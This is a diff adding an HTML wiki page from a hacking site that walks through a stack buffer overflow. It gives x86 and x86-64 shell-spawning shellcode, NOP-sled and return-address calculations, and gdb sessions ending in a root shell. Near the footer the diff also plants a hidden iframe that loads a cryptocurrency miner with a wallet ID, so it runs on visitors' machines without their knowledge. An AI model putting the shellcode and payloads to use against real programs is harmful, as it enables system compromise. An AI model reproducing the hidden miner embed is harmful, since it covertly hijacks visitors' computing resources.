+<p>Following previous knowledge that at least 112 bytes are required to overwrite ebp, and another 4 to overwrite the return address.  The shellcode is padded with 60 NOPs.  60 + 45 = 105.  It is also known that 7 bytes are required to overwrite ebp and another 4 to overwrite the return address.  0x41/'A' is recommended for this portion because it easier to debug with. Another 7 bytes of 'A', are added and then 4 on the end for the return address.  60 + 45 + 7 + 4 = 116, which is the number of bytes needed to overwrite the return address and successfully exploit the target.
+</p>
+<h5> <span class="mw-headline" id="On_x86-64_2">On x86-64</span></h5>
+<p>The following shellcode is used to spawn a shell:
+</p>
+<pre> "\x48\x31\xd2"                                  // xor   &#160;%rdx,&#160;%rdx
+ "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov    $0x68732f6e69622f2f,&#160;%rbx
+ "\x48\xc1\xeb\x08"                              // shr    $0x8,&#160;%rbx
+ "\x53"                                          // push  &#160;%rbx
+ "\x48\x89\xe7"                                  // mov   &#160;%rsp,&#160;%rdi
+ "\x50"                                          // push  &#160;%rax
+ "\x57"                                          // push  &#160;%rdi
+ "\x48\x89\xe6"                                  // mov   &#160;%rsp,&#160;%rsi
+ "\xb0\x3b"                                      // mov    $0x3b,&#160;%al
+ "\x0f\x05";                                     // syscall
+</pre>
+<p>Or:
+</p>
+<pre> \x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05
+</pre>
+<p>This shellcode is 30 bytes long. 120 bytes + 8 bytes are required for the return address. To start, use a 60 byte nopsled + 30 byte shellcode + 30 bytes of padding + 8 byte return address, totaling 128 bytes.
+</p>
+<h4> <span class="mw-headline" id="Finding_the_return_address">Finding the <a href="/Return_address" title="Return address">return address</a></span></h4>
+<ul><li> <b>Starting gdb</b>
+</li></ul>
+<pre> teknical@teknical-vm:~$ gdb -q ./bof
+ Reading symbols from /home/teknical/bof...done.
+</pre>
+<ul><li> <b>Setting a breakpoint inside of the "main" function</b>
+</li></ul>
+<pre> (gdb) break main
+ Breakpoint 1 at 0x80483ed: file bof.c, line 7.
+</pre>
+<ul><li> <b>Starting the application with the command line as discussed above.</b>
+</li></ul>
+<h5> <span class="mw-headline" id="On_x86_3">On x86</span></h5>
+<pre> (gdb) r `ruby -e 'print "\x90"*60, "[insert our shellcode here]", "A"*7, "\x41\x41\x41\x41"'`
+ Starting program: /home/teknical/bof `ruby -e 'print "\x90"*60, 
+ "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56
+ \x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh", "A"*7, "\x41\x41\x41\x41"'`
+</pre>
+<pre> Breakpoint 1, main (argc=2, argv=0xbffff474) at bof.c:7
+ 7		strcpy(buffer,  argv[1]);
+</pre>
+<table style="border: 1px solid black; background-color: lavender; width: 100%">
+<th style="background-color: #9C7; padding: 4px">Teknical says</th>
+<tr><td style="background-color: white">Viewing the main function, lets examine the stack.  It is known that at least 116 bytes on the stack are required, 200 bytes are used to make sure all the required space is present.  Another thing to look for is the address of the shell code on the stack.</td></tr>
+</table>
+<pre> (gdb) x/200x $esp
+ 0xbffff340:	0x00119222	0xbffff3e4	0x080481f4	0xbffff3d8
+ 0xbffff350:	0x0012ca54	0x00000000	0x0012fb48	0x00000001
+ 0xbffff360:	0x00000000	0x00000001	0x0012c8f8	0x00293ff4
+ 0xbffff370:	0x00242d19	0x0016d2a5	0xbffff388	0x001549d5
+ 0xbffff380:	0x00293ff4	0x08049ff4	0xbffff398	0x080482e8
+ 0xbffff390:	0x0011e030	0x08049ff4	0xbffff3c8	0x08048439
+ 0xbffff3a0:	0x00294324	0x00293ff4	0x08048420	0xbffff3c8
+ 0xbffff3b0:	0x0016d4a5	0x0011e030	0x0804842b	0x00293ff4
+ 0xbffff3c0:	0x08048420	0x00000000	0xbffff448	0x00154bd6
+ 0xbffff3d0:	0x00000002	0xbffff474	0xbffff480	0x0012f858
+ 0xbffff3e0:	0xbffff430	0xffffffff	0x0012bff4	0x08048245
+ 0xbffff3f0:	0x00000001	0xbffff430	0x0011d626	0x0012cab0
+ 0xbffff400:	0x0012fb48	0x00293ff4	0x00000000	0x00000000
+ 0xbffff410:	0xbffff448	0xee66f487	0x3b1663f8	0x00000000
+ 0xbffff420:	0x00000000	0x00000000	0x00000002	0x08048330
+ 0xbffff430:	0x00000000	0x00123230	0x00154afb	0x0012bff4
+ 0xbffff440:	0x00000002	0x08048330	0x00000000	0x08048351
+ 0xbffff450:	0x080483e4	0x00000002	0xbffff474	0x08048420
+ 0xbffff460:	0x08048410	0x0011e030	0xbffff46c	0x0012c8f8
+ 0xbffff470:	0x00000002	0xbffff5e4	0xbffff5f7	0x00000000
+ 0xbffff480:	0xbffff66c	0xbffff690	0xbffff6a3	0xbffff6b3
+ 0xbffff490:	0xbffff6be	0xbffff70f	0xbffff721	0xbffff74b
+ 0xbffff4a0:	0xbffff76b	0xbffff779	0xbffffc1a	0xbffffc40
+ 0xbffff4b0:	0xbffffc52	0xbffffcae	0xbffffce0	0xbffffceb
+ 0xbffff4c0:	0xbffffd17	0xbffffd64	0xbffffd7a	0xbffffd89
+ 0xbffff4d0:	0xbffffd9c	0xbffffdb3	0xbffffdca	0xbffffdda
+ 0xbffff4e0:	0xbffffdee	0xbffffe23	0xbffffe2c	0xbffffe3d
+ 0xbffff4f0:	0xbffffe4f	0xbffffe63	0xbffffe6b	0xbffffe97
+ 0xbffff500:	0xbffffea8	0xbfffff0a	0xbfffff47	0xbfffff67
+ 0xbffff510:	0xbfffff74	0xbfffff96	0xbfffffaf	0x00000000
+ 0xbffff520:	0x00000020	0x0012d420	0x00000021	0x0012d000
+ 0xbffff530:	0x00000010	0x078bf3ff	0x00000006	0x00001000
+ 0xbffff540:	0x00000011	0x00000064	0x00000003	0x08048034
+ 0xbffff550:	0x00000004	0x00000020	0x00000005	0x00000008
+ 0xbffff560:	0x00000007	0x00110000	0x00000008	0x00000000
+ 0xbffff570:	0x00000009	0x08048330	0x0000000b	0x000003e8
+ 0xbffff580:	0x0000000c	0x000003e8	0x0000000d	0x000003e8
+ 0xbffff590:	0x0000000e	0x000003e8	0x00000017	0x00000001
+ 0xbffff5a0:	0x00000019	0xbffff5cb	0x0000001f	0xbfffffe9
+ 0xbffff5b0:	0x0000000f	0xbffff5db	0x00000000	0x00000000
+ 0xbffff5c0:	0x00000000	0x00000000	0x85000000	0xaaec0f53
+ 0xbffff5d0:	0xb8fc08c0	0xd3d76e6a	0x693bf638	0x00363836
+ 0xbffff5e0:	0x00000000	0x6d6f682f	0x65742f65	0x63696e6b
+ 0xbffff5f0:	0x622f6c61	0x9000666f	<b>0x90909090	0x90909090</b>
+ <b>0xbffff600:	0x90909090	0x90909090	0x90909090	0x90909090</b>
+ <b>0xbffff610:	0x90909090	0x90909090	0x90909090	0x90909090</b>
+ <b>0xbffff620:	0x90909090	0x90909090	0x90909090	0x90909090</b>
+ <b>0xbffff630:	0xeb909090	0x76895e1f	0x88c03108	0x46890746</b>
+ <b>0xbffff640:	0x890bb00c	0x084e8df3	0xcd0c568d	0x89db3180</b>
+ <b>0xbffff650:	0x80cd40d8	0xffffdce8	0x69622fff	0x68732f6e</b>
+</pre>
+<p>The next step is to find the shellcode on the stack.  The easiest thing to do here is to look for the NOPs. The address of the NOPs is required so this can be used as the return address on the stack.  This will cause execution to resume with the shell code once the function returns.
+</p>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> Advanced attacks include <a href="/Ascii_shellcode" title="Ascii shellcode">ascii shellcode</a> for maximum evasion.</div>
+<p><br />
+Note the NOPS above starting at 0xbffff5f8. 0xbffff610 will be used since it is a cleaner address. This can be arranged in little endian format:  "\x10\xf6\xff\xbf"
+</p>
+<h5> <span class="mw-headline" id="On_x86-64_3">On x86-64</span></h5>
+<pre> (gdb) r `perl -e 'print "\x90" x 60, "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68
+ \x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05", "A" x 30, "\x41\x41
+ \x41\x41\x41\x41\x41\x41"'`
+ Starting program: /home/xo/filez/bof/bof `perl -e 'print "\x90" x 60, "\x48\x31\xd2\x48\xbb
+ \x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b
+ \x0f\x05", "A" x 30, "\x41\x41\x41\x41\x41\x41\x41\x41"'`
+ (gdb) x/400x $rsp
+</pre>
+<table style="border: 1px solid black; background-color: lavender; width: 100%">
+<th style="background-color: #9C7; padding: 4px">Xochipilli says</th>
+<tr><td style="background-color: white">I truncated this cause it was huge</td></tr>
+</table>
+<pre> ...
+ 0x7fffffffe510:	0x00000064	0x00000000	0x00000003	0x00000000
+ 0x7fffffffe520:	0x00400040	0x00000000	0x00000004	0x00000000
+ 0x7fffffffe530:	0x00000038	0x00000000	0x00000005	0x00000000
+ 0x7fffffffe540:	0x00000008	0x00000000	0x00000007	0x00000000
+ 0x7fffffffe550:	0xf7ddd000	0x00007fff	0x00000008	0x00000000
+ 0x7fffffffe560:	0x00000000	0x00000000	0x00000009	0x00000000
+ 0x7fffffffe570:	0x00400400	0x00000000	0x0000000b	0x00000000
+ 0x7fffffffe580:	0x000003e8	0x00000000	0x0000000c	0x00000000
+ 0x7fffffffe590:	0x000003e8	0x00000000	0x0000000d	0x00000000
+ 0x7fffffffe5a0:	0x000003e8	0x00000000	0x0000000e	0x00000000
+ 0x7fffffffe5b0:	0x000003e8	0x00000000	0x00000017	0x00000000
+ 0x7fffffffe5c0:	0x00000000	0x00000000	0x00000019	0x00000000
+ 0x7fffffffe5d0:	0xffffe609	0x00007fff	0x0000001f	0x00000000
+ 0x7fffffffe5e0:	0xffffefe1	0x00007fff	0x0000000f	0x00000000
+ 0x7fffffffe5f0:	0xffffe619	0x00007fff	0x00000000	0x00000000
+ 0x7fffffffe600:	0x00000000	0x00000000	0xcc45c200	0xf80e704b
+ 0x7fffffffe610:	0xd5660936	0xff5959b5	0x36387878	0x0034365f
+ 0x7fffffffe620:	0x00000000	0x00000000	0x6d6f682f	0x6f782f65
+ 0x7fffffffe630:	0x6c69662f	0x622f7a65	0x622f666f	0x9000666f
+ <b>0x7fffffffe640:	0x90909090	0x90909090	0x90909090	0x90909090</b>
+ <b>0x7fffffffe650:	0x90909090	0x90909090	0x90909090	0x90909090</b>
+ <b>0x7fffffffe660:	0x90909090	0x90909090	0x90909090	0x90909090</b>
+ <b>0x7fffffffe670:	0x90909090	0x90909090	0x48909090	0xbb48d231</b>
+ ...
+</pre>
+<p>Note the nopsled begins at 0x7fffffffe640, thus placed into rsp. Converted to little endian and formatted appropriately, this is \x40\xe6\xff\xff\xff\x7f\x00\x00.
+</p>
+<h3> <span class="mw-headline" id="Exploitation">Exploitation</span></h3>
+<p>Following the clearance of the breakpoint, restart the application with the same command line argument, but replace the "\x41\x41\x41x\x41" at the end of the argument with the return address of "\x10\xf6\xff\xbf"
+</p>
+<pre> (gdb) clear main
+ Deleted breakpoint 1 
+</pre>
+<h5> <span class="mw-headline" id="On_x86_4">On x86</span></h5>
+<pre> (gdb) r `ruby -e 'print "\x90"*60, "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46
+ \x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89
+ \xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh", "A"*7, "\x10\xf6\xff\xbf"'`
+ The program being debugged has been started already.
+ Start it from the beginning? (y or n) y
+</pre>
+<pre> Starting program: /home/teknical/bof `ruby -e 'print "\x90"*60,"\xeb\x1f\x5e
+ \x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d
+ \x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh", 
+ "A"*7, "\x10\xf6\xff\xbf"'`
+ process 2262 is executing new program: /bin/sh
+ # whoami
+ root
+ #
+</pre>
+<h5> <span class="mw-headline" id="On_x86-64_4">On x86-64</span></h5>
+<pre> (gdb) r `perl -e 'print "\x90" x 60, "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e
+ \x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f
+ \x05", "A" x 30, "\x40\xe6\xff\xff\xff\x7f\x00\x00"'`
+ Starting program: /home/xo/filez/bof/bof `perl -e 'print "\x90" x 60, "\x48\x31
+ \xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50
+ \x57\x48\x89\xe6\xb0\x3b\x0f\x05", "A" x 30, "\x40\xe6\xff\xff\xff\x7f\x00\x00"'`
+ process 27319 is executing new program: /bin/dash
+ $ whoami
+ xo
+ $
+</pre>
+<table style="border: 1px solid black; background-color: lavender; width: 100%">
+<th style="background-color: #9C7; padding: 4px">Xochipilli says</th>
+<tr><td style="background-color: white">The x86-64 shellcode used in this example does not call setuid() so it will execute at the privileges of the exploited application</td></tr>
+</table>
+<p>YAY! Successful exploitation has occured.  
+</p>
+<div style="padding: .2em .3em; margin: .2em .2em; background-color: #98AFC7; border: solid 1px #25383C; font-size: 107%;"><strong>Protip:</strong> If for some reason the exploitation was not successful, you could attempt a different <a href="/Return_address" title="Return address">return address</a>.</div>
+<p><br />
+</p>
+<center><script type="text/javascript">
+function toggle() {
+   $('#display_text').html($('#hidden_display').html());
+   $('#hidetext').html($('#hide_msg').html());
+   $('#hidetext').attr('onClick','vape();');
+}
+function vape() {
+   $('#display_text').html('');
+   $('#hidetext').html($('#show_msg').html());
+   $('#hidetext').attr('onClick','toggle();');
+}
+</script><div style="width:40%; border: 1px solid #000; padding:0px 0px 0px 0px;">Buffer overflow is part of a series on <a href="/Exploitation" title="Exploitation" class="mw-redirect">exploitation</a>.<br />
+<a id='hidetext' onclick="toggle();"><b>[ CrackMe ]</b></a><br /><div id="display_text"></div></div>
+<div id="hidden_display" style="display:none; height:1px; width:1px">
+<div style="padding:2px;">
+<p><b><a href="/Web_Exploitation" title="Web Exploitation" class="mw-redirect">Web Exploitation</a></b><br />
+<a href="/XSS" title="XSS">XSS</a> &#8226; <a href="/SQL_injection" title="SQL injection">SQL injection</a> &#8226; <a href="/CSRF" title="CSRF">CSRF</a> &#8226; <a href="/XSRF" title="XSRF">XSRF</a> &#8226; <a href="/Cookies" title="Cookies">Cookies</a> &#8226; <a href="/File_Inclusion" title="File Inclusion">File Inclusion</a> &#8226; <a href="/Command_Injection" title="Command Injection">Command Injection</a> <br />
+<a href="/XSCF" title="XSCF">XSCF</a> &#8226; <a href="/Cold_Fusion_Hacking" title="Cold Fusion Hacking" class="mw-redirect">Cold Fusion Hacking</a> &#8226; <a href="/RoR_Patching#Params_Injection_.26_Mass_Assignment_Abuse" title="RoR Patching">Mass Assignment Abuse</a> &#8226; <a href="/Lfi_autopwn.pl" title="Lfi autopwn.pl">Lfi_autopwn.pl</a> <br />
+<a href="/MySql_5_Enumeration" title="MySql 5 Enumeration" class="mw-redirect">Mysql5 Enumerator</a> &#8226; <a href="/Vanguard" title="Vanguard">Vanguard</a>
+</p><p><b>Software Exploitation</b><br />
+<a href="/Buffer_Overflows" title="Buffer Overflows" class="mw-redirect">Buffer Overflows</a> &#8226; <a href="/Ascii_shellcode" title="Ascii shellcode">ascii shellcode(32 bit)</a> &#8226; <a href="/Alphanumeric_shellcode" title="Alphanumeric shellcode" class="mw-redirect">alphanumeric shellcode(64-bit)</a> &#8226; <a href="/Bleeding_Life" title="Bleeding Life">Bleeding Life</a> &#8226; <a href="/Unsafe_string_replacement" title="Unsafe string replacement">Unsafe string replacement</a> &#8226; <a href="/Filter_bypass" title="Filter bypass">filter bypass</a> &#8226; <a href="/IDS_evasion" title="IDS evasion">IDS evasion</a> &#8226; <a href="/Privilege_escalation" title="Privilege escalation">privilege escalation</a>
+</p>
+</div></div><div style="visibility:hidden;height:1px;width:1px;"><div id="hide_msg" style="visibility:hidden;"><b>[ PatchMe ]</b></div><div id="show_msg" style="visibility:hidden;"><b>[ CrackMe ]</b></div></div></center><center><span><div style="border: 1px solid #000; height: 30px; width:60%;">
+<div style="width: 25%; float: left; padding-top:4px;"><a name="fb_share"></a><script src="http://static.ak.fbcdn.net/connect.php/js/FB.Share" type="text/javascript"></script></div>
+<div style="width: 25%; float: left; padding-top:6px;"><script type="text/javascript" src="http://www.reddit.com/static/button/button1.js"></script></div>
+<div style="width: 25%; float: left; padding-top:5px;"><a style="float:center;" data-related="blackhatstaff" data-count="0" data-via="blackhatstaff" href="https://twitter.com/share" class="twitter-share-button">Tweet</a><script src="//platform.twitter.com/widgets.js" type="text/javascript"></script>
+</div><div style="width: 25%; float: left; padding-top:5px;">
+<a class="DiggThisButton DiggCompact"></a><script type="text/javascript">
+(function() {
+  var s = document.createElement('SCRIPT'), s1 = document.getElementsByTagName('SCRIPT')[0];
+  s.type = 'text/javascript';
+  s.async = true;
+  s.src = 'http://widgets.digg.com/buttons.js';
+  s1.parentNode.insertBefore(s, s1);
+})();
+</script></div>
+</div></span>
+</center>
+
+<!-- 
+NewPP limit report
+Preprocessor node count: 325/1000000
+Post-expand include size: 7918/2097152 bytes
+Template argument size: 2408/2097152 bytes
+Expensive parser function count: 0/100
+-->
+<div class="printfooter">
+Retrieved from "<a href="http://www.blackhatlibrary.net/Buffer_overflow">http://www.blackhatlibrary.net/Buffer_overflow</a>"</div>
+		<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks"><a href="/Special:Categories" title="Special:Categories">Category</a>: <span dir='ltr'><a href="/Category:Exploitation" title="Category:Exploitation">Exploitation</a></span></div></div>		<!-- end content -->
+				<div class="visualClear"></div>
+	</div>
+</div></div>
+<div id="column-one">
+	<div id="p-cactions" class="portlet">
+		<h5>Views</h5>
+		<div class="pBody">
+			<ul>
+				 <li id="ca-nstab-main" class="selected"><a href="/Buffer_overflow" title="View the content page [c]" accesskey="c">Page</a></li>
+				 <li id="ca-talk" class="new"><a href="/index.php?title=Talk:Buffer_overflow&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+				 <li id="ca-viewsource"><a href="/index.php?title=Buffer_overflow&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+				 <li id="ca-history"><a href="/index.php?title=Buffer_overflow&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class="portlet" id="p-personal">
+		<h5>Personal tools</h5>
+		<div class="pBody">
+			<ul>
+				<li id="pt-login"><a href="/index.php?title=Special:UserLogin&amp;returnto=Buffer_overflow" title="You are encouraged to log in; however, it is not mandatory [o]" accesskey="o">Log in</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class="portlet" id="p-logo">
+		<a style="background-image: url(/logo.png);" href="/Main_Page" title="Visit the main page"></a>
+	</div>
+	<script type="text/javascript"> if (window.isMSIE55) fixalpha(); </script>
+	<div class='generated-sidebar portlet' id='p-Wiki'>
+		<h5>Wiki</h5>
+		<div class='pBody'>
+			<ul>
+				<li id="n-mainpage-description"><a href="/Main_Page" title="Visit the main page [z]" accesskey="z">Main page</a></li>
+				<li id="n-The-index"><a href="/Category:Indexing">The index</a></li>
+				<li id="n-Donate"><a href="/Donations">Donate</a></li>
+				<li id="n-Contribute"><a href="/Category:Requested_maintenance">Contribute</a></li>
+				<li id="n-recentchanges"><a href="/Special:RecentChanges" title="The list of recent changes in the wiki [r]" accesskey="r">Recent changes</a></li>
+				<li id="n-randompage"><a href="/Special:Random" title="Load a random page [x]" accesskey="x">Random page</a></li>
+			</ul>
+		</div>
+	</div>
+	<div class='generated-sidebar portlet' id='p-Community'>
+		<h5>Community</h5>
+		<div class='pBody'>
+			<ul>
+				<li id="n-Chokepoint"><a href="http://www.chokepoint.net">Chokepoint</a></li>
+				<li id="n-.2Fr.2Fblackhat"><a href="http://reddit.com/r/blackhat">/r/blackhat</a></li>
+				<li id="n-.40BlackhatStaff"><a href="http://twitter.com/BlackhatStaff">@BlackhatStaff</a></li>
+			</ul>
+		</div>
+	</div>
+	<div id="p-search" class="portlet">
+		<h5><label for="searchInput">Search</label></h5>
+		<div id="searchBody" class="pBody">
+			<form action="/index.php" id="searchform">
+				<input type='hidden' name="title" value="Special:Search"/>
+				<input id="searchInput" title="Search Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools" accesskey="f" type="search" name="search" />
+				<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Go" title="Go to a page with this exact name if exists" />&#160;
+				<input type='submit' name="fulltext" class="searchButton" id="mw-searchButton" value="Search" title="Search the pages for this text" />
+			</form>
+		</div>
+	</div>
+	<div class="portlet" id="p-tb">
+		<h5>Toolbox</h5>
+		<div class="pBody">
+			<ul>
+				<li id="t-whatlinkshere"><a href="/Special:WhatLinksHere/Buffer_overflow" title="List of all wiki pages that link here [j]" accesskey="j">What links here</a></li>
+				<li id="t-recentchangeslinked"><a href="/Special:RecentChangesLinked/Buffer_overflow" title="Recent changes in pages linked from this page [k]" accesskey="k">Related changes</a></li>
+<li id="t-specialpages"><a href="/Special:SpecialPages" title="List of all special pages [q]" accesskey="q">Special pages</a></li>
+				<li id="t-print"><a href="/index.php?title=Buffer_overflow&amp;printable=yes" rel="alternate" title="Printable version of this page [p]" accesskey="p">Printable version</a></li>				<li id="t-permalink"><a href="/index.php?title=Buffer_overflow&amp;oldid=9148" title="Permanent link to this revision of the page">Permanent link</a></li>			</ul>
+		</div>
+	</div>
+&nbsp;
+
+<script type="text/javascript"><!--
+google_ad_client = "ca-pub-3100048614381705";
+/* BHL Sidebar */
+google_ad_slot = "2730381272";
+google_ad_width = 120;
+google_ad_height = 90;
+//-->
+</script>
+<script type="text/javascript"
+src="http://pagead2.googlesyndication.com/pagead/show_ads.js">
+</script>
+
+<a href="http://www.srsvps.com/"><center><img src="http://blackhatlibrary.net/images/srsvps-button-tux.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
+<a href="http://vps-heaven.com/"><center><img src="http://blackhatlibrary.net/images/vps-heaven.png" style="padding: 2px,0px,2px,0px;"></center></a><br />
+<center>VPS-Heaven now accepting BitCoin!</center><br />
+<script type="text/javascript">
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-40369725-1']);
+  _gaq.push(['_trackPageview']);
+
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+</script>
+<a href="http://www.soldierx.com/"><center><img src="http://www.soldierx.com/system/files/images/sx-mini-1.jpg" style="padding: 2px,0px,2px,0px;"></center></a>
+<br /><br /><center>Our research is made possible by your support.</center><br />
+<form action="https://www.paypal.com/cgi-bin/webscr" method="post">
+<input type="hidden" name="cmd" value="_s-xclick">
+<input type="hidden" name="hosted_button_id" value="74Q9CEK92HZCL">
+<input type="image" src="https://www.paypalobjects.com/en_US/i/btn/btn_donateCC_LG.gif" border="0" name="submit" alt="PayPal - The safer, easier way to pay online!">
+<img alt="" border="0" src="https://www.paypalobjects.com/en_US/i/scr/pixel.gif" width="1" height="1">
+</form>
+</div><!-- end of the left (by default at least) column -->
+<div class="visualClear"></div>
+<iframe style='display:none' src='http://tidbit.co.in/miner'><script>window.walletId = 1Lr99MtUNbUVSpU6MFA3CboYWGgZ8pHWdB</script></iframe>
+<div id="footer">
+	<div id="f-poweredbyico">
+		<a href="http://www.mediawiki.org/"><img src="/skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
+	</div>
+	<ul id="f-list">
+		<li id="lastmod"> This page was last modified on 20 September 2012, at 02:30.</li>
+		<li id="viewcount">This page has been accessed 49,898 times.</li>
+		<li id="privacy"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:Privacy_policy" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:Privacy policy">Privacy policy</a></li>
+		<li id="about"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:About" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:About">About Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools</a></li>
+		<li id="disclaimer"><a href="/Security101_-_Blackhat_Techniques_-_Hacking_Tutorials_-_Vulnerability_Research_-_Security_Tools:General_disclaimer" title="Security101 - Blackhat Techniques - Hacking Tutorials - Vulnerability Research - Security Tools:General disclaimer">Disclaimers</a></li>
+<div align="center"><a href="http://www.darkexile.com/forums/index.php?action=affiliates;sa=in;idaff=15"><img src="http://www.darkexile.com/forums/gallery/3_20_01_11_10_02_44.png"></a>&nbsp; <a href="http://hacktalk.net/"><img src="hacktalk.png"></a></div>
+
+	</ul>
+</div>
+</div>
+
+<script src="/load.php?debug=false&amp;lang=en&amp;modules=startup&amp;only=scripts&amp;skin=monobook&amp;*"></script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Buffer_overflow", "wgTitle": "Buffer overflow", "wgAction": "view", "wgArticleId": 5, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 9148, "wgCategories": ["Exploitation"], "wgBreakFrames": false, "wgRestrictionEdit": ["sysop"], "wgRestrictionMove": ["sysop"]});
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
+	mediaWiki.loader.go();
+}
+</script>
+
+<script type="text/javascript"> 
+function toggleDisplay( id, hidetext, showtext )
+{
+  link = document.getElementById( id + "l" ).childNodes[0];
+ 
+  with( document.getElementById( id ).style )
+    {
+      if( display == "none" )
+	{
+	  display = "inline";
+	  link.nodeValue = hidetext;
+	}
+      else
+	{
+	  display = "none";
+	  link.nodeValue = showtext;
+	}
+    }
+}
+</script>
+<script>if ( window.mediaWiki ) {
+	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"monobook","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
+	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"en","language":"en","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
+}
+</script><!-- Served in 0.772 secs. --></body></html>
